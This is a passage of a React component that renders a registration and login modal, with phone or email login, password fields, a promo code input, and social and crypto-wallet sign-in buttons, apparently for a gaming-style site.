                      className="win-promo-input"
                      placeholder="Enter promo code (e.g. VIP2026)"
                      value={regPromo}
                      onChange={(e) => setRegPromo(e.target.value)}
                    />
                  </div>
                )}
              </div>

              {/* Terms Checkbox */}
              <div className="win-terms-group">
                <label className="win-terms-label">
                  <input
                    type="checkbox"
                    className="win-terms-checkbox"
                    checked={regAgreed}
                    onChange={(e) => {
                      setRegAgreed(e.target.checked);
                      if (e.target.checked) setRegAgreedErr('');
                    }}
                  />
                  <span className="win-terms-text">
                    By clicking Register, I accept{' '}
                    <a href="#" className="win-link-blue" onClick={(e) => e.preventDefault()}>
                      the User Agreement
                    </a>
                  </span>
                </label>
                {regAgreedErr && <span className="win-field-error-text">{regAgreedErr}</span>}
              </div>

              {/* Register Button */}
              <button
                type="submit"
                className="win-btn-submit win-btn-register"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Registering...' : 'Register'}
              </button>
            </form>

            {/* Divider 'or' */}
            <div className="win-divider">
              <span>or</span>
            </div>

            {/* Social Registration Row */}
            <div className="win-social-row">
              <button type="button" className="win-social-btn" aria-label="Register with Google">
                <GoogleIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with Telegram">
                <TelegramIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with WebMoney">
                <WebMoneyIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with MetaMask">
                <MetaMaskFoxIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Register with Trust Wallet">
                <ShieldIcon />
              </button>
            </div>

            {/* Footer Switch to Login */}
            <div className="win-footer-switch">
              <span>Already have an account? </span>
              <button
                type="button"
                className="win-link-blue win-link-bold"
                onClick={() => {
                  setAuthMode('login');
                  clearAllErrors();
                }}
              >
                Log in
              </button>
            </div>
          </div>
        ) : (
          /* ===================================================================
              VIEW: LOGIN FORM
              =================================================================== */
          <div className="win-auth-card-body">
            {/* Header: Title + Close Button */}
            <div className="win-auth-header">
              <h2 className="win-auth-title">Log in</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Close login"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            {/* Sub-tabs: Phone vs Email */}
            <div className="win-login-subtabs">
              <button
                type="button"
                className={`win-login-subtab${loginSubTab === 'phone' ? ' win-login-subtab--active' : ''}`}
                onClick={() => {
                  setLoginSubTab('phone');
                  clearAllErrors();
                }}
              >
                Phone
              </button>
              <button
                type="button"
                className={`win-login-subtab${loginSubTab === 'email' ? ' win-login-subtab--active' : ''}`}
                onClick={() => {
                  setLoginSubTab('email');
                  clearAllErrors();
                }}
              >
                Email
              </button>
            </div>

            <form noValidate onSubmit={handleLoginSubmit} className="win-form">
              {loginSubTab === 'phone' ? (
                <div className="win-field-group">
                  <div className={`win-field-pill${loginPhoneErr ? ' win-field-pill--error' : ''}`}>
                    <button
                      type="button"
                      className="win-country-prefix-btn"
                      onClick={() => {
                        setCountrySearch('');
                        setSubView('country');
                      }}
                      aria-label="Select country code"
                    >
                      <span className="win-country-prefix-flag">{loginPhoneCountry.flag}</span>
                      <ChevronDownIcon className="win-prefix-chevron" />
                    </button>
                    <div className="win-field-vdivider" />
                    <span className="win-dialcode-badge">{loginPhoneCountry.code}</span>
                    <input
                      type="tel"
                      className="win-field-input"
                      placeholder="00000 00000"
                      autoComplete="tel"
                      value={loginPhone}
                      onChange={(e) => handlePhoneChange(e.target.value, setLoginPhone)}
                      onFocus={() => setLoginPhoneErr('')}
                    />
                  </div>
                  {loginPhoneErr && <span className="win-field-error-text">{loginPhoneErr}</span>}
                </div>
              ) : (
                <div className="win-field-group">
                  <div className={`win-field-pill${loginEmailErr ? ' win-field-pill--error' : ''}`}>
                    <span className="win-field-icon">
                      <EnvelopeIcon />
                    </span>
                    <div className="win-field-vdivider" />
                    <input
                      type="email"
                      className="win-field-input"
                      placeholder="Email"
                      autoComplete="email"
                      value={loginEmail}
                      onChange={(e) => setLoginEmail(e.target.value)}
                      onFocus={() => setLoginEmailErr('')}
                    />
                  </div>
                  {loginEmailErr && <span className="win-field-error-text">{loginEmailErr}</span>}
                </div>
              )}

              {/* Password */}
              <div className="win-field-group">
                <div className={`win-field-pill${loginPwdErr ? ' win-field-pill--error' : ''}`}>
                  <span className="win-field-icon">
                    <LockIcon />
                  </span>
                  <div className="win-field-vdivider" />
                  <input
                    type={showLoginPwd ? 'text' : 'password'}
                    className="win-field-input"
                    placeholder="Password"
                    autoComplete="current-password"
                    value={loginPwd}
                    onChange={(e) => setLoginPwd(e.target.value)}
                    onFocus={() => setLoginPwdErr('')}
                  />
                  <button
                    type="button"
                    className="win-field-pwd-toggle"
                    aria-label="Toggle password visibility"
                    onClick={() => setShowLoginPwd(!showLoginPwd)}
                  >
                    <EyeIcon show={showLoginPwd} />
                  </button>
                </div>
                {loginPwdErr && <span className="win-field-error-text">{loginPwdErr}</span>}
              </div>

              {/* Forgot Password */}
              <div className="win-forgot-pwd-wrap">
                <button type="button" className="win-link-blue" onClick={(e) => e.preventDefault()}>
                  Forgot your password?
                </button>
              </div>

              {/* Log in Button */}
              <button
                type="submit"
                className="win-btn-submit win-btn-login"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Logging in...' : 'Log in'}
              </button>
            </form>

            {/* Divider 'or' */}
            <div className="win-divider">
              <span>or</span>
            </div>

            {/* Social Login Row */}
            <div className="win-social-row">
              <button type="button" className="win-social-btn" aria-label="Log in with Google">
                <GoogleIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Log in with Telegram">
                <TelegramIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Log in with WebMoney">
                <WebMoneyIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Log in with MetaMask">
                <MetaMaskFoxIcon />
              </button>
              <button type="button" className="win-social-btn" aria-label="Log in with Trust Wallet">
                <ShieldIcon />
              </button>
            </div>

            {/* Footer Switch to Register */}
            <div className="win-footer-switch">
              <span>Don&apos;t have an account? </span>
              <button
                type="button"
                className="win-link-blue win-link-bold"
                onClick={() => {
                  setAuthMode('register');
                  clearAllErrors();
                }}
              >
                Register
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
